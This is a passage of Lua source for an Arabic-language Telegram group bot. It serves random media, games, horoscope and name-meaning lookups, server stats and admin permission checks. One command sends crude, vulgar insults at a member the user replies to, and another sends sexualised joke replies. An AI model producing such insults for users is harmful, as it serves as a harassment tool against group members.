https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/VVVYVV4/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == "غنيلي" or text == "غني" then

if not redis:get(bot_id.."trfeh"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • التسليه معطل من قبل المشرفين","md",true)
end
Abs = math.random(2,140);
local Text ='↯ : ﭑݪفِۅيسَ ، حِسب ذۅقيّ ♥️، '
local MsgId = msg.id/2097152/0.5
local MSGID = string.gsub(MsgId,'.0','')
keyboard = {}
keyboard.inline_keyboard = {{{text = '• مره أخرى •', callback_data = msg.sender.user_id..'/kanele'}},{{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}},}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/L_W_2/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..MsgId.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "شعر" or text == "اشعار" then

if not redis:get(bot_id.."trfeh"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • التسليه معطل من قبل المشرفين","md",true)
end
Abs = math.random(2,168);
local Text ='تم اختيار الشعر لك '
local MsgId = msg.id/2097152/0.5
local MSGID = string.gsub(MsgId,'.0','')
keyboard = {}
keyboard.inline_keyboard = {{{text = '• مره أخرى •', callback_data = msg.sender.user_id..'/shaera'}},{{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}},}
local msg_id = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/rteww0/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..MsgId.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "صوره" or text == "افتار" then

if not redis:get(bot_id.."trfeh"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • التسليه معطل من قبل المشرفين","md",true)
end
Abs = math.random(2,140);
local Text ='تم اختيار افتار لك'
local MsgId = msg.id/2097152/0.5
local MSGID = string.gsub(MsgId,'.0','')
keyboard = {}  
keyboard.inline_keyboard = {{{text = '•مره أخرى •',callback_data = msg.sender.user_id..'/aftar'}},{{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}},}
local msg_id = msg.id/2097152/0.5 
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/nyx441/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..MsgId.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "ميمز" or text == "ميمزات" then

if not redis:get(bot_id.."trfeh"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • التسليه معطل من قبل المشرفين","md",true)
end
Abs = math.random(2,140);
local Text ='تم اختيار ميمز لك'
local MsgId = msg.id/2097152/0.5
local MSGID = string.gsub(MsgId,'.0','')
keyboard = {}  
keyboard.inline_keyboard = {{{text = '• مره أخرى •',callback_data = msg.sender.user_id..'/memz'}},{{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}},}
local msg_id = msg.id/2097152/0.5 
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/MemzDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..MsgId.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "صور شباب" or text == "افتارات شباب" then

if not redis:get(bot_id.."trfeh"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • التسليه معطل من قبل المشرفين","md",true)
end
Abs = math.random(2,140);
local Text ='تم اختيار افتار شباب لك'
local MsgId = msg.id/2097152/0.5
local MSGID = string.gsub(MsgId,'.0','')
keyboard = {}  
keyboard.inline_keyboard = {{{text = '•مره أخرى •',callback_data = msg.sender.user_id..'/aftboy'}},{{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}},}
local msg_id = msg.id/2097152/0.5 
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/avboytol/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..MsgId.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "صور بنات" then

if not redis:get(bot_id.."trfeh"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • التسليه معطل من قبل المشرفين","md",true)
end
Abs = math.random(2,140);
local Text ='تم اختيار افتار بنات لك'
local MsgId = msg.id/2097152/0.5
local MSGID = string.gsub(MsgId,'.0','')
keyboard = {}  
keyboard.inline_keyboard = {{{text = '•مره أخرى •',callback_data = msg.sender.user_id..'/aftgir'}},{{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}},}
local msg_id = msg.id/2097152/0.5 
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/QXXX_4/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..MsgId.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "متح" or text == "متحركه" then

if not redis:get(bot_id.."trfeh"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • التسليه معطل من قبل المشرفين","md",true)
end
Abs = math.random(2,142);
local Text ='تم اختيار متحركه لك'
local MsgId = msg.id/2097152/0.5
local MSGID = string.gsub(MsgId,'.0','')
keyboard = {}  
keyboard.inline_keyboard = {{{text = '• مره أخرى •',callback_data = msg.sender.user_id..'/gifed'}},{{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}},}
local msg_id = msg.id/2097152/0.5 
https.request("https://api.telegram.org/bot"..Token..'/sendanimation?chat_id=' .. msg.chat_id .. '&animation=https://t.me/LKKKKR/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..MsgId.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "فلم" or text == "افلام" then

if not redis:get(bot_id.."trfeh"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • التسليه معطل من قبل المشرفين","md",true)
end
Abs = math.random(2,140);
local Text ='تم اختيار افلام لك'
local MsgId = msg.id/2097152/0.5
local MSGID = string.gsub(MsgId,'.0','')
keyboard = {}  
keyboard.inline_keyboard = {{{text = '• مره أخرى •',callback_data = msg.sender.user_id..'/fillm'}},{{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}},}
local msg_id = msg.id/2097152/0.5 
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/MoviesDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..MsgId.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "انمي" or text == "انميي" then

if not redis:get(bot_id.."trfeh"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • التسليه معطل من قبل المشرفين","md",true)
end
Abs = math.random(2,140);
local Text ='تم اختيار انمي لك'
local MsgId = msg.id/2097152/0.5
local MSGID = string.gsub(MsgId,'.0','')
keyboard = {}  
keyboard.inline_keyboard = {{{text = '• مره أخرى •',callback_data = msg.sender.user_id..'/anme'}},{{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}},}
local msg_id = msg.id/2097152/0.5 
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. msg.chat_id .. '&photo=https://t.me/AnimeDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..MsgId.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "ستوري" or text == "استوري" then

if not redis:get(bot_id.."trfeh"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • التسليه معطل من قبل المشرفين","md",true)
end
Abs = math.random(2,140);
local Text =''
local MsgId = msg.id/2097152/0.5
local MSGID = string.gsub(MsgId,'.0','')
keyboard = {}  
keyboard.inline_keyboard = {{{text = '• استوري آخر •',callback_data = msg.sender.user_id..'/stor'}},{{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}},}
local msg_id = msg.id/2097152/0.5 
https.request("https://api.telegram.org/bot"..Token..'/sendanimation?chat_id=' .. msg.chat_id .. '&animation=https://t.me/stortolen/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..MsgId.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "ريمكس" or text == "ريماكس" then

if not redis:get(bot_id.."trfeh"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • التسليه معطل من قبل المشرفين","md",true)
end
Abs = math.random(2,140);
local Text ='تم اختيار ريماكس لك'
local MsgId = msg.id/2097152/0.5
local MSGID = string.gsub(MsgId,'.0','')
keyboard = {}  
keyboard.inline_keyboard = {{{text = '• مره أخرى •',callback_data = msg.sender.user_id..'/remix'}},{{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}},}
local msg_id = msg.id/2097152/0.5 
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. msg.chat_id .. '&voice=https://t.me/RemixDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..MsgId.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text and text:match('^اهداء @(%S+)$') then
local UserName = text:match('^اهداء @(%S+)$') 

mmsg = bot.getMessage(msg.chat_id,msg.reply_to_message_id)
if mmsg and mmsg.content then
if mmsg.content.luatele ~= "messageVoiceNote" and mmsg.content.luatele ~= "messageAudio" then
return bot.sendText(msg.chat_id,msg.id,'*↯︙عذرأ لا ادعم هذا النوع من الاهدائات*',"md",true)  
end
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
return bot.sendText(msg.chat_id,msg.id,"\n*↯︙عذرآ لا يوجد حساب بهذا المعرف*","md",true)   end
local UserInfo = bot.getUser(UserId_Info.id)
if UserInfo.first_name and UserInfo.first_name ~= "" then
local reply_markup = bot.replyMarkup{type = 'inline',data = {{{text = '‹ رابط الاهداء ›', url ="https://t.me/c/"..string.gsub(msg.chat_id,"-100",'').."/"..(msg.reply_to_message_id/2097152/0.5)}}}}
local UserInfom = bot.getUser(msg.sender.user_id)
if UserInfom.username and UserInfom.username ~= "" then
Us = '@['..UserInfom.username..']' 
else 
Us = 'لا يوجد ' 
end
bot.deleteMessages(msg.chat_id,{[1]= msg.id})
return bot.sendText(msg.chat_id,msg.reply_to_message_id,'*↯︙هذا الاهداء لـك ( @'..UserInfo.username..' ) عمري فقط ♥️\n↯︙اضغط على رابط الهداء للستماع الى البصمة  ↓\n↯︙صاحب الاهداء هـوه »* '..Us..'',"md",true, false, false, false, reply_markup)  
end
end
end

if text == "شنو رئيك بهذا" or text == "شنو رئيك بهذ" then
local texting = {"ادب سسز يباوع علي بنات ??🥺"," مو خوش ولد 😶","زاحف وما احبه 😾😹"}
bot.sendText(msg.chat_id,msg.id,"*"..texting[math.random(#texting)].."*","md", true)
end
if text == "شنو رئيك بهاي" or text == "شنو رئيك بهايي" then
local texting = {"دور حلوين 🤕😹","جكمه وصخه عوفها ☹️😾","حقيره ومنتكبره 😶😂"}
bot.sendText(msg.chat_id,msg.id,"*"..texting[math.random(#texting)].."*","md", true)
end
if text == "هينه" or text == "رزله" then
heen = {
"↯ حبيبي علاج الجاهل التجاهل ."
,"↯ مالي خلك زبايل التلي . "
,"↯ كرامتك صارت بزبل פَــبي ."
,"↯ مو صوجك صوج الكواد الزمك جهاز ."
,"↯ لفارغ استجن . "
,"↯ لتتلزك بتاجراسك ."
,"↯ ملطلط دي ."
};
sendheen = heen[math.random(#heen)]
if tonumber(msg.reply_to_message_id) == 0 then
bot.sendText(msg.chat_id,msg.id,"*↯︙يجب عمل رد على رساله شخص .*","md", true)
return false
end
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if developer(Remsg) then
bot.sendText(msg.chat_id,msg.id,"*↯︙لا خاف عيب هذا مطوري .*","md", true)
return false
end
bot.sendText(msg.chat_id,msg.reply_to_message_id,"*"..sendheen.."*","md", true)
end
if text == "بوسه" or text == "مصه" then
heen = {
"↯ اوف احلا بوسه الحات محححح 💞🙊"
,"↯ مححح يكفي 💞 "
,"↯ وصخ هذا مابوسه 😭😂."
,"↯ حط الشفه ع الشفه وصاحت اوه 😂."
,"↯ تعبان مابوسك هسه 😒💔 "
};
sendheen = heen[math.random(#heen)]
if tonumber(msg.reply_to_message_id) == 0 then
bot.sendText(msg.chat_id,msg.id,"*↯︙يجب عمل رد على رساله شخص .*","md", true)
return false
end
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
if developer(Remsg) then
bot.sendText(msg.chat_id,msg.id,"*↯︙مح احلا بوسه المطوري 💞🙊.*","md", true)
return false
end
bot.sendText(msg.chat_id,msg.reply_to_message_id,"*"..sendheen.."*","md", true)
end

if text == "تاكات" then

if Administrator(msg) then
local arr = {
"@ل15 كله اكثر انمي تتابعه؟",
"@ل13 كله اكثر فلم تحبه ؟",
"@ل10 كله لعبه تحبها؟",
"@ل17 كله اغنيـۿ تحبها ؟",
"@ل4 كله اعترفلي ؟",
"@ل7 كله اعترف بموقف محرج ؟",
"@ل6 كله اعترف بسر ؟",
"@ل4 كله انته كي  ؟",
"@ل8 كله اريد اخطفك؟",
"@ل9 كله انطيني بوسه ؟",
"@ل10 كله انطيني حضن ؟",
"@ل9 كله انطيني رقمك ؟",
"@ل2 كله انطيني سنابك؟",
"@ل9 كله انطيني انستكرامك ؟",
"@ل12 كله اريد هديه؟",
"@ل11 كله نلعب  ؟",
"@ل6 كله اقرالي شعر؟",
"@ل7 كله غنيلي واغنيلك ؟",
"@ل13 كله ليش انته حلو؟",
"@ل3 كله انت كرنج ؟",
"@ل1 كله نتهامس؟",
"@ل6 كله اكرهك ؟",
"@ل8 كله احبك؟",
"@ل5 كله نتعرف ؟",
"@ل2 كله نتصاحب وتحبني؟",
"@ل3 كله انته حلو ؟",
"@ل2 كله احبك وتحبني؟",
"@ل15 كله اكثر اكله تحبها؟",
"@ل13 كله اكثر مشروب تحبه ؟",
"@ل10 كله اكثر نادي تحبه؟",
"@ل17 كله اكثر ممثل تحبه ؟",
"@ل4 كله صوره لخاصك ؟",
"@ل7 كله صوره لبرامجك ؟",
"@ل6 كله  صوره لحيوانك ؟",
"@ل4 كله صوره لقنواتك ؟",
"@ل8 كله عمرك خنت شخص؟",
"@ل9 كله كم مره حبيت  ؟",
"@ل10 كله اعترف لشخص؟",
"@ل9 كله اتحب الالعاب ؟",
"@ل2 كله تحب الشعر؟",
"@ل9 كله تحب الاغاني ؟",
"@ل12 كله اريد ايفون ؟",
"@ل11 كله تحب الفراوله  ؟",
"@ل6 كله تحب المونستر؟",
"@ل7 كله تحب الاكل؟ ؟",
"@ل13 كله تحب الككو ؟",
"@ل3 كله تحب البيض ؟",
"@ل1 كله بلوك منحياتي ؟",
"@ل6 كله كرشت عليك ؟",
"@ل8 كله نصير بيست ؟",
"@ل5 كله انتت قمر ؟",
"@ل2 كله نتزوج؟",
"@ل3 كله انته مرتبط ؟",
"@ل2 كله نطمس؟",
"@ل8 كله تريد شكليطه؟",
"@ل9 كله تحب  السمك  ؟",
"@ل10 كله تحب الكلاب ؟",
"@ل9 كله تحب القطط ؟",
"@ل2 كله تحب الريمكسات",
"@ل9 كله تحب الراب ؟",
"@ل12 كله تحب بنترست ؟",
"@ل11 كله تحب التيك توك  ؟",
"@ل6 كله اكثر متحركه تحبها",
"@ل7 كله اكثر فويس تحبه ؟",
"@ل13 كله اكثر ستيكر تحبه؟",
"@ل3 كله ماذا لو عاد متعتذرا ؟",
"@ل1 كله خذني بحضنك ؟",
"@ل6 كله اثكل شوي ؟",
"@ل8 كله اهديني اغنيه ؟",
"@ل5 كله حبيتك ؟",
"@ل2 كله انت لطيف ؟",
"@ل3 كله انت عصبي  ؟",
"@ل2 كله اكثر ايموجي تحبه؟"
}
bot.sendText(msg.chat_id,0,arr[math.random(#arr)],"md", true)
redis:setex(bot_id..":PinMsegees:"..msg.chat_id,60,text)
end
end

if text and text:match("^زخرفه (.*)$") then

if not redis:get(bot_id.."myzhrfa"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • الزخرفه معطلة من قبل المشرفين","md",true)
end
local TextZhrfa = text:match("^زخرفه (.*)$")
zh = io.popen('curl -s "https://apiabs.ml/zrf.php?abs='..URL.escape(TextZhrfa)..'"'):read('*a')
zx = JSON.decode(zh) 
t = "\n• قائمه الزخرفه \n━━━━━━━━━━━\n"
i = 0
for k,v in pairs(zx.ok) do
i = i + 1
t = t..i.."-  "..v.." \n"
end
return bot.sendText(msg.chat_id,msg.id, t..'*━━━━━━━━━━━*',"md",true)
end
if text and text:match("^برج (.*)$") then

if not redis:get(bot_id.."brjj"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • الابراج معطلة من قبل المشرفين","md",true)
end
local Textbrj = text:match("^برج (.*)$")
gk = io.popen('curl -s "https://apiabs.ml/brg.php?brg='..URL.escape(Textbrj)..'"'):read('*a')
br = JSON.decode(gk)
bot.sendText(msg.chat_id,msg.id, br.ok.abs)
end 
if text and text:match("^معنى اسم (.*)$") then 

if not redis:get(bot_id.."name:k"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • معاني الاسماء معطلة من قبل المشرفين","md",true)
end
local TextMean = text:match("^معنى اسم (.*)$")
UrlMean = io.popen('curl -s "https://apiabs.ml/Mean.php?Abs='..URL.escape(TextMean)..'"'):read('*a')
Mean = JSON.decode(UrlMean) 
bot.sendText(msg.chat_id,msg.id, Mean.ok.abs)
end  
if text and text:match("^احسب (.*)$") then

if not redis:get(bot_id.."calculate"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • حساب العمر معطل من قبل المشرفين","md",true)
end
local Textage = text:match("^احسب (.*)$")
ge = io.popen('curl -s "https://apiabs.ml/age.php?age='..URL.escape(Textage)..'"'):read('*a')
ag = JSON.decode(ge)
bot.sendText(msg.chat_id,msg.id, ag.ok.abs)
end  

if text == 'السيرفر' then
if not devB(msg.sender.user_id) then 
return bot.sendText(msg.chat_id,msg.id,'\n*• هذا الامر يخص المطور الاساسي * ',"md",true)  
end
bot.sendText(msg.chat_id,msg.id, io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '•  •⊱ { نظام التشغيل } ⊰•\n*»» '"$linux_version"'*' 
echo '*------------------------------\n*•  •⊱ { الذاكره العشوائيه } ⊰•\n*»» '"$memUsedPrc"'*'
echo '*------------------------------\n*•  •⊱ { وحـده الـتـخـزيـن } ⊰•\n*»» '"$HardDisk"'*'
echo '*------------------------------\n*•  •⊱ { الـمــعــالــج } ⊰•\n*»» '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
echo '*------------------------------\n*•  •⊱ { الــدخــول } ⊰•\n*»» '`whoami`'*'
echo '*------------------------------\n*•  •⊱ { مـده تـشغيـل الـسـيـرفـر } ⊰•  \n*»» '"$uptime"'*'
]]):read('*all'),"md")
end

if text and text:match('^صلاحياته @(%S+)$') then
local UserName = text:match('^صلاحياته @(%S+)$') 
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا يوجد حساب بهذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف قناة او المجموعه ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف البوت ","md",true)  
end
local StatusMember = bot.getChatMember(msg.chat_id,UserId_Info.id).status.luatele
if (StatusMember == "chatMemberStatusCreator") then
return bot.sendText(msg.chat_id,msg.id,"• الصلاحيات : مالك المجموعة","md",true) 
elseif (StatusMember == "chatMemberStatusAdministrator") then
StatusMemberChat = 'مشرف المجموعة'
else
return bot.sendText(msg.chat_id,msg.id,"• الصلاحيات : عضو في المجموعة" ,"md",true) 
end
if StatusMember == "chatMemberStatusAdministrator" then 
local GetMemberStatus = bot.getChatMember(msg.chat_id,UserId_Info.id).status
if GetMemberStatus.can_change_info then
change_info = '❬ ✔️ ❭' else change_info = '❬ ❌ ❭'
end
if GetMemberStatus.can_delete_messages then
delete_messages = '❬ ✔️ ❭' else delete_messages = '❬ ❌ ❭'
end
if GetMemberStatus.can_invite_users then
invite_users = '❬ ✔️ ❭' else invite_users = '❬ ❌ ❭'
end
if GetMemberStatus.can_pin_messages then
pin_messages = '❬ ✔️ ❭' else pin_messages = '❬ ❌ ❭'
end
if GetMemberStatus.can_restrict_members then
restrict_members = '❬ ✔️ ❭' else restrict_members = '❬ ❌ ❭'
end
if GetMemberStatus.can_promote_members then
promote = '❬ ✔️ ❭' else promote = '❬ ❌ ❭'
end
local PermissionsUserr = '*\n• صلاحياته :\n━━━━━━━━━━━'..'\n• تغيير المعلومات : '..change_info..'\n• تثبيت الرسائل : '..pin_messages..'\n• اضافه مستخدمين : '..invite_users..'\n• مسح الرسائل : '..delete_messages..'\n• حظر المستخدمين : '..restrict_members..'\n• اضافه المشرفين : '..promote..'\n\n*'
return bot.sendText(msg.chat_id,msg.id,"• الصلاحيات : مشرف المجموعة"..(PermissionsUserr or '') ,"md",true) 
end
end
if text == 'نزلني' then

if not redis:get(bot_id.."Abs:Nzlne:Abs"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id," • امر نزلني معطل من قبل المشرفين","md",true)
end
if Controllerbanall(msg.sender.user_id,msg.chat_id) == true then 
return bot.sendText(msg.chat_id,msg.id,"\n*• عذراً لا استطيع تنزيل { "..Get_Rank(msg.sender.user_id,msg.chat_id).." } *","md",true)  
end
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = ' نعم ', data = msg.sender.user_id..'/Nzlne'},{text = ' لا ', data = msg.sender.user_id..'/noNzlne'},
},
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›', url = 't.me/QQOQQD'}, 
},
}
}
return bot.sendText(msg.chat_id,msg.id,' • هل انت متأكد ؟',"md",false, false, false, false, reply_markup)
end

if text and text:match('^التفاعل @(%S+)$') then
local UserName = text:match('^التفاعل @(%S+)$') 
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا يوجد حساب بهذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف قناة او المجموعه ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف البوت ","md",true)  
end
TotalMsg = redis:get(bot_id..":"..msg.chat_id..":"..UserId_Info.id..":message") or 1
TotalMsgT = Total_message(TotalMsg) 
return bot.sendText(msg.chat_id,msg.id,"• "..TotalMsgT, "md")
end

if text and text:match('^الرتبه @(%S+)$') then
local UserName = text:match('^الرتبه @(%S+)$') 
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا يوجد حساب بهذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف قناة او المجموعه ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return bot.sendText(msg.chat_id,msg.id,"\n• عذراً لا تستطيع استخدام معرف البوت ","md",true)  
end
local RinkBot = Get_Rank(msg.chat_id,UserId_Info.id)
return bot.sendText(msg.chat_id,msg.id,RinkBot, "md")
end

if text and text:match("^كول (.*)$") then
if redis:get(bot_id.."Abs:kol:Abs"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id, text:match('كول (.*)'),"md",true)  
end
end

if text and text:match("^كولي (.*)$") then
if redis:get(bot_id.."Abs:kol:Abs"..msg.chat_id) then
return bot.sendText(msg.chat_id,msg.id, text:match('كولي (.*)'),"md",true)  
end
end
if text == "تحكم" and msg.reply_to_message_id ~= 0 and Administrator(msg) then

Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text ="قائمه 'الرفع و التنزيل'",data="control_"..msg.sender.user_id.."_"..UserInfo.id.."_1"}},
{{text ="قائمه 'العقوبات'",data="control_"..msg.sender.user_id.."_"..UserInfo.id.."_2"}},
{{text = "كشف 'المعلومات'" ,data="control_"..msg.sender.user_id.."_"..UserInfo.id.."_3"}},
}
}
bot.sendText(msg.chat_id,msg.id,"*↯︙اختر الامر المناسب*","md", true, false, false, false, reply_markup)
end
if text and text:match('^تحكم (%d+)$') and msg.reply_to_message_id == 0 and Administrator(msg) then
local UserName = text:match('^تحكم (%d+)$')

local UserInfo = bot.getUser(UserName)
if UserInfo.code == 400 or UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"*↯︙الایدي خطأ .*","md",true)  
return false
end
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text ="قائمه 'الرفع و التنزيل'",data="control_"..msg.sender.user_id.."_"..UserInfo.id.."_1"}},
{{text ="قائمه 'العقوبات'",data="control_"..msg.sender.user_id.."_"..UserInfo.id.."_2"}},
{{text = "كشف 'المعلومات'" ,data="control_"..msg.sender.user_id.."_"..UserInfo.id.."_3"}},
}
}
bot.sendText(msg.chat_id,msg.id,"*↯︙اختر الامر المناسب .*","md", true, false, false, false, reply_markup)
end
if text and text:match('^تحكم @(%S+)$') and msg.reply_to_message_id == 0 and Administrator(msg) then
local UserName = text:match('^تحكم @(%S+)$')

local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*↯︙اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*↯︙اليوزر لقناه او مجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*↯︙عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text ="قائمه 'الرفع و التنزيل'",data="control_"..msg.sender.user_id.."_"..UserId_Info.id.."_1"}},
{{text ="قائمه 'العقوبات'",data="control_"..msg.sender.user_id.."_"..UserId_Info.id.."_2"}},
{{text = "كشف 'المعلومات'" ,data="control_"..msg.sender.user_id.."_"..UserId_Info.id.."_3"}},
}
}
bot.sendText(msg.chat_id,msg.id,"*↯︙اختر الامر المناسب .*","md", true, false, false, false, reply_markup)
end
----------------------------------------------------------------------------------------------------
if text == "تقييد لرتبه" and programmer(msg) or text == "تقيد لرتبه" and programmer(msg) then

reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'منشى اساسي'" ,data="changeofvalidity_"..msg.sender.user_id.."_5"}},
{{text = "'منشئ'" ,data="changeofvalidity_"..msg.sender.user_id.."_4"}},
{{text = "'مدير'" ,data="changeofvalidity_"..msg.sender.user_id.."_3"}},
{{text = "'ادمن'" ,data="changeofvalidity_"..msg.sender.user_id.."_2"}},
{{text = "'مميز'" ,data="changeofvalidity_"..msg.sender.user_id.."_1"}},
}
}
bot.sendText(msg.chat_id,msg.id,"*↯︙قم بأختيار الرتبه التي تريد تققيد محتوى لها .*","md", true, false, false, false, reply_markup)
end

if text == 'id' or text == 'Id' or text == 'ID' then
local ban = bot.getUser(msg.sender.user_id)
if ban.first_name then
news = " "..ban.first_name.." "
else
news = " لا يوجد"
end
if ban.first_name then
UserName = ' '..ban.first_name..' '
else
UserName = 'لا يوجد'
end
if ban.username then
banusername = '@'..ban.username..''
else
banusername = 'لا يوجد'
end
local UserId = msg.sender.user_id
local RinkBot = Get_Rank(msg.sender.user_id,msg.chat_id)
local TotalMsg = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1
local news = 'ɪᴅ : '..UserId
local uass = 'ɴᴀᴍᴇ : '..UserName
local banhas = 'ᴜѕᴇ : '..banusername
local rengk = 'ѕᴛᴀ : '..RinkBot
local masha = 'ᴍѕɢ : '..TotalMsg
local BIO = 'ʙɪᴏ : '..GetBio(msg.sender.user_id)
local again = '[‹ ‹ TeAm MeLaNo  ›  ›](t.me/QQOQQD)'
local reply_markup = bot.replyMarkup{type = 'inline',data = {
{
